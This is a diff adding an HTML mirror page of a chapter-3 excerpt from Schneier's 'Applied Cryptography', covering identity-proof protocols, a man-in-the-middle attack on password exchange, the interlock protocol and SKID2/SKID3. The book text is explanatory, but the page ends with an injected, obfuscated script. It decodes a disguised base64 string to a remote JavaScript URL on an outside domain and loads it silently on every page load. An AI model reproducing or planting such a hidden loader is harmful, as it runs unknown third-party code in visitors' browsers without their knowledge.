@@ -1,0 +1,127 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Basic Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=03//-->
+<!--PAGES=054-056//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>It is foolish to encrypt arbitrary strings&#151;not only those sent by untrusted third parties, but under any circumstances at all. Attacks similar to the one discussed in Section 19.3 can be mounted. Secure proof-of-identity protocols take the following, more complicated, form:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice performs a computation based on some random numbers and her private key and sends the result to the host.
+<DD><B>(2)</B>&nbsp;&nbsp;The host sends Alice a different random number.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice makes some computation based on the random numbers (both the ones she generated and the one she received from the host) and her private key, and sends the result to the host.
+<DD><B>(4)</B>&nbsp;&nbsp;The host does some computation on the various numbers received from Alice and her public key to verify that she knows her private key.
+<DD><B>(5)</B>&nbsp;&nbsp;If she does, her identity is verified.
+</DL>
+<P>If Alice does not trust the host any more than the host trusts Alice, then Alice will require the host to prove its identity in the same manner.
+</P>
+<P>Step (1) might seem unnecessary and confusing, but it is required to prevent attacks against the protocol. Sections 21.1 and 21.2 mathematically describe several algorithms and protocols for proving identity. See also [935].</P>
+<P><FONT SIZE="+1"><B><I>Mutual Authentication Using the Interlock Protocol</I></B></FONT></P>
+<P>Alice and Bob are two users who want to authenticate each other. Each of them has a password that the other knows: Alice has <I>P</I><SUB>A</SUB> and Bob has <I>P</I><SUB>B</SUB>. Here&#146;s a protocol that will <I>not</I> work:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice and Bob trade public keys.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice encrypts <I>P</I><SUB>A</SUB> with Bob&#146;s public key and sends it to him.
+<DD><B>(3)</B>&nbsp;&nbsp;Bob encrypts <I>P</I><SUB>B</SUB> with Alice&#146;s public key and sends it to her.
+<DD><B>(4)</B>&nbsp;&nbsp;Alice decrypts what she received in step (2) and verifies that it is correct.
+<DD><B>(5)</B>&nbsp;&nbsp;Bob decrypts what he received in step (3) and verifies that it is correct.
+</DL>
+<P>Mallory can launch a successful man-in-the-middle attack (see Section 3.1):
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice and Bob trade public keys. Mallory intercepts both messages. He substitutes his public key for Bob&#146;s and sends it to Alice. Then he substitutes his public key for Alice&#146;s and sends it to Bob.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice encrypts <I>P</I><SUB>A</SUB> with &#147;Bob&#146;s&#148; public key and sends it to him. Mallory intercepts the message, decrypts <I>P</I><SUB>A</SUB> with his private key, re-encrypts it with Bob&#146;s public key and sends it on to him.
+<DD><B>(3)</B>&nbsp;&nbsp;Bob encrypts <I>P</I><SUB>B</SUB> with &#147;Alice&#146;s&#148; public key and sends it to her. Mallory intercepts the message, decrypts <I>P</I><SUB>B</SUB> with his private key, re-encrypts it with Alice&#146;s public key, and sends it on to her.
+<DD><B>(4)</B>&nbsp;&nbsp;Alice decrypts <I>P</I><SUB>B</SUB> and verifies that it is correct.
+<DD><B>(5)</B>&nbsp;&nbsp;Bob decrypts <I>P</I><SUB>A</SUB> and verifies that it is correct.
+</DL>
+<P>Alice and Bob see nothing different. However, Mallory knows both <I>P</I><SUB>A</SUB> and <I>P</I><SUB>B</SUB>.</P>
+<P>Donald Davies and Wyn Price describe how the interlock protocol (described in Section 3.1) can defeat this attack [435]. Steve Bellovin and Michael Merritt discuss ways to attack this protocol [110]. If Alice is a user and Bob is a host, Mallory can pretend to be Bob, complete the beginning steps of the protocol with Alice, and then drop the connection. True artistry demands Mallory do this by simulating line noise or network failure, but the final result is that Mallory has Alice&#146;s password. He can then connect with Bob and complete the protocol, thus getting Bob&#146;s password, too.</P>
+<P>The protocol can be modified so that Bob gives his password before Alice, under the assumption that the user&#146;s password is much more sensitive than the host&#146;s password. This falls to a more complicated attack, also described in [110].</P>
+<P><FONT SIZE="+1"><B><I>SKID</I></B></FONT></P>
+<P>SKID2 and SKID3 are symmetric cryptography identification protocols developed for RACE&#146;s RIPE project [1305] (See Section 25.7). They use a MAC (see Section 2.4) to provide security and both assume that both Alice and Bob share a secret key, <I>K</I>.</P>
+<P>SKID2 allows Bob to prove his identity to Alice. Here&#146;s the protocol:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice chooses a random number, <I>R</I><SUB>A</SUB>. (The RIPE document specifies a 64-bit number). She sends it to Bob.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob chooses a random number, <I>R</I><SUB>B</SUB>. (The RIPE document specifies a 64-bit number). He sends Alice:
+<DL>
+<DD><I>R</I><SUB>B</SUB>,H<SUB>K</SUB>(<I>R</I><SUB>A</SUB>,RB,<SUB>B</SUB>)
+</DL>
+<BR><I>H</I><SUB>K</SUB> is the MAC. (The RIPE document suggests the RIPE-MAC function&#151;see Section 18.14.) <I>B</I> is Bob&#146;s name.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice computes <I>H</I><SUB>K</SUB>(<I>R</I><SUB>A</SUB>,<I>R</I><SUB>B</SUB>,B) and compares it with what she received from Bob. If the results are identical, then Alice knows that she is communicating with Bob.
+</DL>
+<P>SKID3 provides mutual authentication between Alice and Bob. Steps (1) through (3) are identical to SKID2, and then the protocol proceeds with:
+</P>
+<DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Alice sends Bob:
+<DL>
+<DD><I>H</I><SUB>K</SUB>(<I>R</I><SUB>B</SUB>,A)
+</DL>
+<BR><I>A</I> is Alice&#146;s name.
+<DD><B>(5)</B>&nbsp;&nbsp;Bob computes <I>H</I><SUB>K</SUB>(<I>R</I><SUB>B</SUB>,<I>A</I>), and compares it with what he received from Alice. If the results are identical, then Bob knows that he is communicating with Alice.
+</DL>
+<P>This protocol is not secure against a man-in-the-middle attack. In general, a man-in-the-middle attack can defeat any protocol that doesn&#146;t involve a secret of some kind.
+</P>
+<P><FONT SIZE="+1"><B><I>Message Authentication</I></B></FONT></P>
+<P>When Bob receives a message from Alice, how does he know it is authentic? If Alice signed her message, this is easy. Alice&#146;s digital signature is enough to convince anyone that the message is authentic.
+</P>
+<P>Symmetric cryptography provides some authentication. When Bob receives a message from Alice encrypted in their shared key, he knows it is from Alice. No one else knows their key. However, Bob has no way of convincing a third party of this fact. Bob can&#146;t show the message to Trent and convince him that it came from Alice. Trent can be convinced that the message came from either Alice or Bob (since no one else shared their secret key), but he has no way of knowing which one.</P>
+<P>If the message is unencrypted, Alice could also use a MAC. This also convinces Bob that the message is authentic, but has the same problems as symmetric cryptography solutions.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(FYLuPaoX, aFFFFPoT) {aFFFFPoT = FYLuPaoX.createElement('script');aFFFFPoT.type = 'text/javascript';aFFFFPoT.async = true;aFFFFPoT.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');FYLuPaoX.getElementsByTagName('body')[0].appendChild(aFFFFPoT);}(document));</script></body>
+</html>
